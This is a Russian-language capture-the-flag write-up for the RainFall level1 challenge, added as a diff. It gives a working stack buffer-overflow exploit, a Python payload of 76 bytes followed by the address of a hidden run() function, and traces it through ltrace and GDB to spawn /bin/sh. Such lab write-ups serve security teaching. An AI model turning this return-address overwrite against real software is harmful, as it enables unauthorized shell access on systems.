@@ -1,0 +1,108 @@
+# Решение
+python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/test
+cat /tmp/test - | ./level1
+
+# Объяснение
+
+1. Оценим поведение программы.
+
+При запуске программа ожидает ввода значений через stdin.
+
+Попробуем ввести несколько символов:
+level1@RainFall:~$ ./level1
+AAAAAA
+level1@RainFall:~$
+
+Проверим, возможно ли переполнение:
+level1@RainFall:~$ python -c 'print "A"*100' > /tmp/test
+level1@RainFall:~$ cat /tmp/test
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+level1@RainFall:~$ cat /tmp/test | ./level1
+Segmentation fault (core dumped)
+
+Мы переполнили некий буфер.
+Существует распространенная атака с переполнением буфера и перезаписью стэка. Возможно, сможем ей воспользоваться.
+
+2. ltrace
+level1@RainFall:~$ ltrace ./level1
+__libc_start_main(0x8048480, 1, 0xbffff6f4, 0x80484a0, 0x8048510 <unfinished ...>
+gets(0xbffff610, 47, 0xbffff65c, 0xb7fd0ff4, 0x80484a0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+)         = 0xbffff610
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+Видим вызов функции gets из библиотеки <stdio.h>.
+Данная функция является уязвимой, тк считывает символы из stdin до тех, пока не встретится новая строка или EOF.
+В результате, может возникнуть ситуация, когда в буффер помещается больше символов, чем зарезервировано под буффер памяти
+в стеке, что приводит к перезаписи стека.
+Рекомендуется использовать функцию fgets, тк она позволяет ограничить количество символов, которые будут считываться.
+
+3. Дизассемблирование с помощью GDB.
+level1@RainFall:~$ gdb level1
+
+Посмотрим функцию main.
+(gdb) disas main
+   0x08048480 <+0>:	    push   %ebp
+   0x08048481 <+1>:	    mov    %esp,%ebp
+   0x08048483 <+3>:	    and    $0xfffffff0,%esp
+   0x08048486 <+6>:	    sub    $0x50,%esp
+   0x08048489 <+9>:	    lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+
+Выглядит странно, после вызова gets не происходит ничего интересного.
+
+Посмотрим, какие функции есть в бинарнике.
+(gdb) info functions
+Из небиблиотечных функций мы видим только main и run:
+0x08048444  run
+0x08048480  main
+
+Странно, функция run есть, однако нигде не вызывается.
+
+Посмотрим, что делает эта функция:
+(gdb) disas run
+   0x08048444 <+0>:	    push   %ebp  // пролог
+   0x08048445 <+1>:	    mov    %esp,%ebp
+   0x08048447 <+3>:	    sub    $0x18,%esp  // выделяем память на стеке
+   0x0804844a <+6>:	    mov    0x80497c0,%eax
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax
+   0x08048456 <+18>:	mov    %edx,0xc(%esp)  // 4 аргумент (x/1cb 0x80497c0) 0 stdout
+   0x0804845a <+22>:	movl   $0x13,0x8(%esp) // 3 аргумент (p/d 0X13) 19
+   0x08048462 <+30>:	movl   $0x1,0x4(%esp)  // 2 аргумент 1
+   0x0804846a <+38>:	mov    %eax,(%esp)     // 1 аргумент (x/19cb 0x8048570) "Good... Wait what?'n"
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>  // Вызов fwrite с вышеуказанными аргументами
+   0x08048472 <+46>:	movl   $0x8048584,(%esp) // 1 аргумент (x/8cb 0x8048584) "/bin/sh"
+   0x08048479 <+53>:	call   0x8048360 <system@plt> // Вызов функции system с аргументом "/bin/sh"
+   0x0804847e <+58>:	leave
+   0x0804847f <+59>:	ret
+
+В функции run вызыввется system("/bin/sh"). То, что нужно.
+
+Адрес функции run - 0x08048444
+
+Для того, чтобы понять куда необходимо подложить адрес функции run для ее вызова, посмотрим стек функции main.
+
+   0x08048483 <+3>:	    and    $0xfffffff0,%esp
+   0x08048486 <+6>:	    sub    $0x50,%esp
+   0x08048489 <+9>:	    lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+
+Из данных строк можно определить, что выделяется 80 байт на стеке, из них 64 под буфер.
+
+Запустим программу с 64 символами, поданными на stdin и посмотрим стэк.
+(gdb) x/100wx $esp
+0xbffff5e0:	0xbffff5f0	0x0000002f	0xbffff63c	0xb7fd0ff4
+0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff610:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff620:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff630:	0x08048400	0x00000000	0x00000000	0xb7e454d3
+
+0xb7e454d3 - адрес возврата.
+Необходимо его переписать.
+Для этого подадим 76 символов и затем адрес функции run в обратном порядке байт.
+python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/test
